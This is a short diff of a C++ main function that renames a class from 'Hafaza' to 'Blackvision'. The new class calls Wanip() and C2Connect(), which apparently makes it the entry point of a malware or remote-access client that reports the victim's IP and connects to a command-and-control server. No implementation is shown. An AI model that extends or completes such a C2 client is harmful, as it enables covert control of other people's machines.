@@ -1,10 +1,11 @@
 //#include "pch.h"
-#include "Hafaza.h"
+#include "Blackvision.h"
 #include <iostream>
 
 int main()
 {
-	Hafaza angel;
-	angel.Wanip();
-	angel.C2Connect();
+	Blackvision bv;
+	bv.Wanip();
+	bv.C2Connect();
+	return 0;
 }
